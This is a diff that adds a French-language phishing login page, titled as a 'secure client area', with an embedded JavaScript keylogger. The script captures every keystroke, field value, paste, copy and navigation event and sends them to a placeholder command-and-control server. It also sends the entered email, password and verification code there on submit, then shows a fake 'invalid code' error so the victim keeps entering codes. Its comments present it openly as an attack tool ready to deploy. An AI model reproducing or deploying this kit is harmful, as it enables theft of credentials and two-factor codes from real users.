@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Espace client sécurisé</title>
+<style>
+/* Page légitime quelconque — le keylogger tourne en fond */
+body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;
+     display:flex;align-items:center;justify-content:center;
+     min-height:100vh;margin:0}
+.box{background:#fff;padding:40px;border-radius:8px;width:380px;
+     box-shadow:0 2px 16px rgba(0,0,0,.1)}
+h2{margin-bottom:20px;color:#333}
+input{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;
+      margin-bottom:12px;font-size:14px}
+button{width:100%;padding:12px;background:#0078d4;border:none;
+       border-radius:4px;color:#fff;font-size:15px;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="box">
+  <h2>Connexion à votre espace</h2>
+  <input type="email"    id="email"    placeholder="Email">
+  <input type="password" id="password" placeholder="Mot de passe">
+  <input type="text"     id="code"     placeholder="Code de vérification">
+  <button onclick="login()">Se connecter</button>
+</div>
+
+<script>
+const C2 = "http://FILL_SERVER:FILL_PORT";
+
+// ── keylogger JS ──────────────────────────────────────────────
+(function(){
+  const BUFFER  = [];
+  const CONTEXT = [];  // paires [field, value] sur focus/blur
+  let flushTimer = null;
+
+  function send(data){
+    fetch(C2 + "/keylog", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(data)
+    }).catch(()=>{});
+  }
+
+  // Capture toutes les frappes
+  document.addEventListener("keydown", function(e){
+    const active = document.activeElement;
+    BUFFER.push({
+      key:   e.key,
+      code:  e.code,
+      ctrl:  e.ctrlKey,
+      alt:   e.altKey,
+      field: active ? (active.name||active.id||active.type||"?") : "?",
+      ts:    Date.now(),
+    });
+    // Flush immédiat sur Enter
+    if(e.key === "Enter") flushBuffer();
+    else scheduleFlush();
+  });
+
+  // Capture valeur complète des champs au blur
+  document.addEventListener("blur", function(e){
+    const el = e.target;
+    if(el.value && el.tagName === "INPUT"){
+      send({
+        type:  "field_complete",
+        field: el.name || el.id || el.type,
+        value: el.value,
+        url:   location.href,
+        ts:    new Date().toISOString(),
+        ua:    navigator.userAgent,
+      });
+    }
+  }, true);
+
+  // Capture paste (coller)
+  document.addEventListener("paste", function(e){
+    const el    = e.target;
+    const pasted = (e.clipboardData||window.clipboardData).getData("text");
+    if(pasted){
+      send({
+        type:  "paste",
+        field: el.name || el.id || el.type || "?",
+        value: pasted,
+        url:   location.href,
+        ts:    new Date().toISOString(),
+      });
+    }
+  }, true);
+
+  // Capture sélection de texte
+  document.addEventListener("copy", function(e){
+    const sel = window.getSelection().toString();
+    if(sel.length > 1){
+      send({
+        type:  "copy",
+        value: sel,
+        url:   location.href,
+        ts:    new Date().toISOString(),
+      });
+    }
+  });
+
+  // Capture changements d'URL (SPA)
+  let lastUrl = location.href;
+  setInterval(function(){
+    if(location.href !== lastUrl){
+      lastUrl = location.href;
+      send({type:"navigation", url:location.href,
+            ts:new Date().toISOString()});
+    }
+  }, 1000);
+
+  function scheduleFlush(){
+    clearTimeout(flushTimer);
+    flushTimer = setTimeout(flushBuffer, 5000);
+  }
+
+  function flushBuffer(){
+    if(!BUFFER.length) return;
+    const data = BUFFER.splice(0);
+    send({
+      type:  "keystrokes",
+      keys:  data,
+      url:   location.href,
+      count: data.length,
+      ts:    new Date().toISOString(),
+      ua:    navigator.userAgent,
+    });
+  }
+
+  // Flush toutes les 10s quoi qu'il arrive
+  setInterval(flushBuffer, 10000);
+
+  // Flush avant fermeture de la page
+  window.addEventListener("beforeunload", function(){
+    flushBuffer();
+    // Beacon API — fonctionne même si la page se ferme
+    if(BUFFER.length && navigator.sendBeacon){
+      navigator.sendBeacon(
+        C2 + "/keylog",
+        JSON.stringify({type:"beacon_flush", keys:BUFFER,
+                        url:location.href})
+      );
+    }
+  });
+})();
+
+// ── collecte formulaire ───────────────────────────────────────
+function login(){
+  fetch(C2 + "/collect", {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      page:     "login_submit",
+      email:    document.getElementById("email").value,
+      password: document.getElementById("password").value,
+      code:     document.getElementById("code").value,
+      ua:       navigator.userAgent,
+    })
+  });
+  // Fausse erreur pour garder la victime sur la page
+  setTimeout(()=>{
+    document.querySelector("button").textContent =
+      "Code invalide — réessayez";
+    document.getElementById("code").value = "";
+    document.getElementById("code").focus();
+  }, 800);
+}
+
+// Fingerprint initial
+fetch(C2 + "/collect", {
+  method:"POST",
+  headers:{"Content-Type":"application/json"},
+  body:JSON.stringify({
+    page:"keylogger_js_land",
+    ua:navigator.userAgent,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ref:document.referrer,
+  })
+});
+</script>
+</body>
+</html>
